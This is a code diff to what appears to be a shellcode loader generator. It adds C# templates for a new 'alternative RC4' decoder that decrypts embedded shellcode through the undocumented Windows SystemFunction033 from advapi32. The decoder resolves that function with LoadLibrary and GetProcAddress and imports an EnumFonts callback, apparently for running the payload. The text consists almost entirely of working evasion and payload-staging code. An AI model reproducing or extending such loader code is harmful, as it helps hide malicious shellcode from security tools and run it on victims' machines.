@@ -118,11 +118,67 @@ SC_XOR_DECODER = """
   }}
 """
 
+
 # Decoder for RC4 shellcode
 SC_RC4_DECODER = """
     byte[] key = System.Text.Encoding.ASCII.GetBytes("{enc_key}");
     RC4 rc4 = new RC4(key);
     rc4.DecryptInPlace(shellcode);
+"""
+
+SC_SYS32_DECODER_PINVOKE_IMPORT = ["LoadLibrary",
+                                    "GetProcAddress",
+                                    "EnumFonts"]
+
+SC_SYS32_DECODER_CODE_IMPORT = """
+    delegate int SystemFunction033Delegate(ref UString memoryRegion, ref UString keyPointer);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct UString
+    {
+        public uint Length;
+        public uint MaximumLength;
+        public IntPtr Buffer;
+    }
+    delegate int EnumFontProc(string lpelf, IntPtr lpntm, uint FontType, IntPtr lParam);
+"""
+# Decoder for alternative RC4
+SC_SYS32_DECODER = """
+        IntPtr hModule = LoadLibrary("advapi32.dll");
+        if (hModule == IntPtr.Zero)
+        {{
+            // Console.WriteLine("Failed to load advapi32.dll");
+            return;
+        }}
+
+        IntPtr systemFunction033Ptr = GetProcAddress(hModule, "SystemFunction033");
+        if (systemFunction033Ptr == IntPtr.Zero)
+        {{
+            // Console.WriteLine("Failed to locate SystemFunction033");
+            return;
+        }}
+
+        SystemFunction033Delegate SystemFunction033 = Marshal.GetDelegateForFunctionPointer<SystemFunction033Delegate>(systemFunction033Ptr);
+
+        byte[] _key = System.Text.Encoding.ASCII.GetBytes("{enc_key}");
+
+        UString key = new UString();
+        key.Buffer = Marshal.AllocHGlobal(_key.Length);
+        Marshal.Copy(_key, 0, key.Buffer, _key.Length);
+        key.Length = (uint)_key.Length;
+        key.MaximumLength = (uint)_key.Length;
+
+        UString _data = new UString();
+        _data.Buffer = Marshal.AllocHGlobal(shellcode.Length);
+        Marshal.Copy(shellcode, 0, _data.Buffer, shellcode.Length);
+        _data.Length = (uint)shellcode.Length;
+        _data.MaximumLength = (uint)shellcode.Length;
+
+        SystemFunction033(ref _data, ref key); 
+
+        shellcode = new byte[_data.Length];
+        Marshal.Copy(_data.Buffer, shellcode, 0, (int)_data.Length);
+
 """
 
 # Decoder for AES shellcode
